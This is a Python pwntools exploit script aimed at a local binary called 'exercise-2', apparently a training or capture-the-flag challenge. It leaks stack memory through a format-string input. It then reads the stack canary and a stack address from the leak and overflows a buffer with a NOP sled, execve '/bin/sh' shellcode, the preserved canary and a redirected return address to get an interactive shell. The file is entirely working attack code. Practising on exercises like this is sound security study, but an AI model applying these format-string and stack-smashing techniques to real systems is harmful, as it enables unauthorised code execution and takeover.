#!/usr/bin/python3

from pwn import *
import sys

rip = 0x401708
diff_addr = -20960

def generate_payload(canary, ref_stack):
    nop = asm('nop', arch="amd64")
    size = 56
    addr = struct.pack("<Q", (ref_stack + diff_addr))
    c = struct.pack("<Q", canary)
    print('canary %016x' % canary)
    s_code = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
    payload = nop*(size - len(s_code))+ s_code + c + (nop*8) + addr
    return payload

def menu(p, option):
    for _ in range(9):
        p.recvline(timeout=10)
    p.sendline(option)

def create_user_pwn(p):
    owner = p.recvline()
    p.recvline()
    memory = parse_owner(owner)
    rip_a = search_rip(memory)
    canary = get_canary(memory, rip_a)
    stack_ref = get_stack_ref(memory, rip_a)
    payload = generate_payload(canary, stack_ref)
    p.sendline(payload)
    p.recvline()
    p.sendline('a')
    return owner

def parse_owner(owner):
    owner = owner.decode("utf-8")
    memory = owner.split('_')
    memory = memory[:-2]
    for i in range(len(memory)):
        if memory[i] == '(nil)':
            memory[i] = '0x0'
        memory[i] = int(memory[i], 16)
    return memory

def search_rip(memory):
     for i in range(len(memory)):
         if memory[i] == rip:
             return i

def get_canary(memory, rip_a):
    return memory[rip_a - 2]

def get_stack_ref(memory, rip_a):
    return memory[rip_a - 1]

context.binary = './exercise-2'

p = process(context.binary.path)
p.recvline()

p.sendline('%p_'*31)
menu(p, '1')
create_user_pwn(p)
p.interactive()
